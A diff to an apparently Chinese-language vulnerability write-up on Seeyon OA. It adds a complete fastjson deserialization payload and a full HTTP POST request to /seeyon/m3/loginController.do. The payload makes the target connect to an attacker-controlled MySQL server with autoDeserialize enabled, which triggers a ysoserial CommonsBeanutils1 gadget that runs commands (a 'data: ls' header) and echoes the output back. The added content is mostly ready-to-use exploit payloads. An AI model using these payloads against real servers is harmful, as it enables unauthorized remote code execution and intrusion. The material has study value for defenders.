@@ -73,11 +73,43 @@ vps上执行 python server.py，yso看了下这篇文章中师傅改的https://w
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105152116.png)
 
-服务端中找到回显CommonsBeanutils1Tomcat89Echo
+服务端回显CommonsBeanutils1Tomcat89Echo
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105152204.png)
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105152358.png)
+
+完整Payload
+
+```
+_json_params={"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"x.x.x.x","portToConnectTo":3306,"info":{"user":"yso_CommonsBeanutils1Tomcat89Echo_data","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"test","url":"jdbc:mysql://x.x.x.x:3306/test?user=yso_CommonsBeanutils1Tomcat89Echo_data&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"}
+```
+
+## 0x05接口２
+
+```
+POST /seeyon/m3/loginController.do?method=transLogout HTTP/1.1
+Host: x.x.x.x
+Content-Length: 494
+Cache-Control: max-age=0Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+data: ls
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
+Chrome/87.0.4280.88 Safari/537.36
+Accept: 
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.
+8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: 
+JSESSIONID=26FF8158707BB0896A3ACD66EB92DD41; loginPageURL=Connection: close
+statisticId={"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostTo
+ConnectTo":"x.x.x.x","portToConnectTo":3306,"info":{"user":"test","password":"pass","state
+mentInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"
+true","NUM_HOSTS":"1"},"databaseToConnectTo":"test","url":"jdbc:mysql://x.x.x.x:3306/test?
+user=test%26autoDeserialize=true%26statementInterceptors=com.mysql.jdbc.interceptors.ServerStat
+usDiffInterceptor"}
+```
+
+利用也是一样的
 
 ## 参考资料
 
